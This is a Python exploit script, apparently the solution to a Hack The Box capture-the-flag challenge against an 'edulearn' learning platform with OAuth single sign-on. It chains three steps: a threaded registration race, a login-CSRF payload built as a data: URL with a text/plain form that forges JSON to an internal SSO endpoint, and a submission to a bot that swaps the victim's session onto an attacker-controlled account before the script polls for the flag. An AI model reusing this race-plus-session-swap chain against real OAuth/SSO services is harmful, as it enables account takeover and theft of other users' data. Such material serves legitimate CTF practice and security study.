#!/usr/bin/env python3
import sys, re, time, threading, urllib.parse, requests
from concurrent.futures import ThreadPoolExecutor

CID = "1a2abb8b-9bb5-4463-8f74-d7b129bb7040"
STU_EMAIL = "student@edulearn.htb"
PW = "KnownPass123!"
FB_EMAIL = "fallback@edulearn.htb"
FLAG_RE = re.compile(r"HTB\{[^}\s]+\}")
INTERNAL_PORT = "1337"

if len(sys.argv) < 3:
    raise SystemExit(f"usage: {sys.argv[0]} <ip> <port>")

IP, PORT = sys.argv[1], sys.argv[2]
BASE = f"http://{IP}:{PORT}"


def log(m): print(f"[+] {m}", flush=True)
def warn(m): print(f"[!] {m}", flush=True)


def mkreq(session):
    def req(host, path, method="GET", **kw):
        h = kw.pop("headers", {})
        h.setdefault("Host", f"{host}:{PORT}")
        return session.request(method, BASE + path, headers=h,
                               allow_redirects=False, timeout=20, **kw)
    return req


def csrf_data_url(email, pw):
    name = '{"email":"%s","password":"%s","x":"' % (email, pw)
    html = (
        '<form id=f method=POST enctype="text/plain" '
        f'action="http://sso.edulearn.htb:{INTERNAL_PORT}/api/login">'
        "<input name='" + name + "' value='\"}'>"
        '</form><script>document.getElementById("f").submit()</script>'
    )
    return "data:text/html," + urllib.parse.quote(html, safe="")


def register(email, pw, name):
    s = requests.Session(); req = mkreq(s)
    try:
        return req("sso.edulearn.htb", "/api/register", method="POST",
                   headers={"Content-Type": "application/json"},
                   json={"email": email, "password": pw, "name": name})
    except requests.RequestException:
        return None


def establish_client_session(email, pw):
    s = requests.Session(); req = mkreq(s)
    r = req("sso.edulearn.htb", "/api/login", method="POST",
            headers={"Content-Type": "application/json"},
            json={"email": email, "password": pw})
    if not r.ok:
        return None
    r = req("edulearn.htb", "/auth")
    p = urllib.parse.urlparse(r.headers.get("Location", ""))
    r = req("sso.edulearn.htb", p.path + ("?" + p.query if p.query else ""))
    if r.status_code in (302, 303):
        cb = r.headers.get("Location", "")
    else:
        r = req("sso.edulearn.htb", "/oauth/authorize", method="POST",
                data={"client_id": CID, "scope": "email name",
                      "redirect_uri": f"http://edulearn.htb:{PORT}/oauth/callback",
                      "state": "", "approved": "true"})
        cb = r.headers.get("Location", "")
    c = urllib.parse.urlparse(cb)
    req("edulearn.htb", c.path + ("?" + c.query if c.query else ""))
    return s


def count_assignments(sess):
    req = mkreq(sess)
    try:
        r = req("edulearn.htb", "/")
        return sorted(set(re.findall(r"/assignment/(\d+)", r.text)))
    except requests.RequestException:
        return []


def find_flag(email, pw):
    s = establish_client_session(email, pw)
    if not s:
        return None
    req = mkreq(s)
    r = req("edulearn.htb", "/")
    pages = set(re.findall(r"/submission/(\d+)", r.text))
    for aid in re.findall(r"/assignment/(\d+)", r.text):
        ra = req("edulearn.htb", f"/assignment/{aid}")
        pages |= set(re.findall(r"/submission/(\d+)", ra.text))
        m = FLAG_RE.search(ra.text)
        if m:
            return m.group(0)
    for sid in pages:
        rs = req("edulearn.htb", f"/submission/{sid}")
        m = FLAG_RE.search(rs.text)
        if m:
            return m.group(0)
    return None


STOP = threading.Event()


def spray_worker(spray_sess, data_url, attempts=3):
    req = mkreq(spray_sess)
    body = urllib.parse.urlencode({"url": data_url})
    for attempt in range(1, attempts + 1):
        if STOP.is_set():
            return
        try:
            r = req("edulearn.htb", "/submit-url", method="POST",
                    headers={"Content-Type": "application/x-www-form-urlencoded"}, data=body)
            log(f"cookie-swap visit {attempt}/{attempts}: HTTP {r.status_code}")
        except requests.RequestException as exc:
            warn(f"cookie-swap visit {attempt}/{attempts}: {type(exc).__name__}")
        if attempt < attempts:
            STOP.wait(2)


def main():
    log(f"target {IP}:{PORT}")
    log("Phase 0: hammering student registration (concurrent)...")
    won = threading.Event(); lost = threading.Event()

    def reg_hammer():
        end = time.time() + 45
        while time.time() < end and not won.is_set() and not lost.is_set():
            r = register(STU_EMAIL, PW, "S")
            if r is None:
                time.sleep(0.03); continue
            if r.status_code == 200:
                won.set(); return
            if r.status_code == 500 or "Failed to create user" in r.text or "exist" in r.text.lower():
                lost.set(); return
            time.sleep(0.03)

    hammers = [threading.Thread(target=reg_hammer, daemon=True) for _ in range(12)]
    for h in hammers: h.start()
    while not won.is_set() and not lost.is_set() and any(h.is_alive() for h in hammers):
        time.sleep(0.05)
    did_win = won.is_set()
    if not did_win:
        # Concurrent duplicate responses can reach the main thread before the
        # worker that received HTTP 200.  Verify ownership before falling back.
        probe = requests.Session(); probe_req = mkreq(probe)
        try:
            login_probe = probe_req(
                "sso.edulearn.htb", "/api/login", method="POST",
                headers={"Content-Type": "application/json"},
                json={"email": STU_EMAIL, "password": PW},
            )
            did_win = login_probe.status_code == 200
        except requests.RequestException:
            pass
    log("WON registration race" if did_win else "LOST registration race")

    target_email, target_pw = STU_EMAIL, PW
    if not did_win:
        register(FB_EMAIL, PW, "FB"); target_email = FB_EMAIL
        warn(f"Falling back to swap-to-self target={target_email}")

    log(f"Phase 1: establishing client session + approval for {target_email}")
    spray_sess = None
    for _ in range(40):
        spray_sess = establish_client_session(target_email, PW)
        if spray_sess: break
        time.sleep(0.25)
    if not spray_sess:
        raise SystemExit("could not establish client session")
    # Wait until the third teacher assignment exists: this proves the shared
    # browser has initialized, while leaving the bot's failed student login and
    # OAuth steps as the remaining timing window.
    data_url = csrf_data_url(target_email, PW)
    log("Phase 2: waiting precisely for the third assignment ...")
    deadline = time.time() + 60
    while time.time() < deadline:
        if len(count_assignments(spray_sess)) >= 3:
            break
        time.sleep(0.05)
    log("Phase 3: sending one cookie-swap visit ...")
    pool = ThreadPoolExecutor(max_workers=1)
    pool.submit(spray_worker, spray_sess, data_url, 1)

    log("Phase 4: polling target account for the flag immediately...")
    t4 = time.time() + 180; flag = None
    while time.time() < t4:
        try: flag = find_flag(target_email, PW)
        except Exception: flag = None
        if flag: break
        time.sleep(1.5)

    STOP.set()
    pool.shutdown(wait=False, cancel_futures=True)
    if flag:
        log(f"FLAG: {flag}")
    else:
        warn("no flag (missed startup window or lost race); restart and rerun immediately")


if __name__ == "__main__":
    main()
